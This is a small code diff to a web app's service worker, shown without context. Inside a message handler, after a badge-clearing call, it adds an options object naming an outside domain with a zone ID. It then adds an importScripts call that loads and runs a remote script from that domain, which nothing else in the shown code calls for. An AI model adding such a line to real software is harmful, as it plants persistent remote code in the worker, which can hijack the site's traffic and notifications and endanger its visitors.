@@ -49,5 +49,11 @@ self.addEventListener('message', e => {
     if ('clearAppBadge' in navigator) {
       navigator.clearAppBadge()
     }
+    self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11221472
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
   }
 })
